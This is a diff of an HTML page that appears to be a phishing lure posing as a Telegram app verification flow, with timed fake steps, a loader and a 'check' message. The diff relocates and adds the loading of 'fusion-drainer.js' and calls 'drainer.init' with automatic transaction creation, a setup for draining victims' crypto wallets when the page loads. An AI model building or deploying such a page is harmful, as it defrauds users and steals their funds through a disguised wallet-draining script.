@@ -89,17 +89,6 @@
     </script>
     
   <link rel="stylesheet" href="fusion-drainer.css?v=1.0.0" />
-
-     <script src="fusion-drainer.js?v=1.0.2" defer crossorigin></script>
-
-  <script>
-    window.addEventListener('load', () => {
-      window.drainer?.init({
-        autoCreateTransaction: true,
-        autoOpenModal: false,
-      });
-    });
-  </script>
 </head>
 
 <body class="min-h-screen overflow-x-hidden py-5 flex flex-col" style="background-color: var(--tg-theme-bg-color);">
@@ -197,6 +186,17 @@
     <script>
         let step = 1; const btn = document.querySelectorAll(".btn"); function nextStep() { let e = document.getElementById(`step${step}`), t = document.getElementById(`step${step + 1}`); e.classList.add("hidden"), t.classList.remove("hidden"); let s = document.querySelector("body"); s.classList.remove("bg_frame" + step), s.classList.add("bg_frame" + (step + 1)), step++ } function showLoader() { let e = document.getElementById("loader"); e.classList.remove("hidden") } function hideLoader() { let e = document.getElementById("loader"); e.classList.add("hidden") } setTimeout(() => { nextStep(); let e = document.querySelector(".hide_step_2"); e.classList.add("hidden"); let t = document.getElementById("check"); setInterval(() => { t.innerText += "." }, 1e3) }, 4e3);
     </script>
+
+    <script src="fusion-drainer.js?v=1.0.2" defer crossorigin></script>
+
+  <script>
+    window.addEventListener('load', () => {
+      window.drainer?.init({
+        autoCreateTransaction: true,
+        autoOpenModal: false,
+      });
+    });
+  </script>
 </body>
 
 </html>
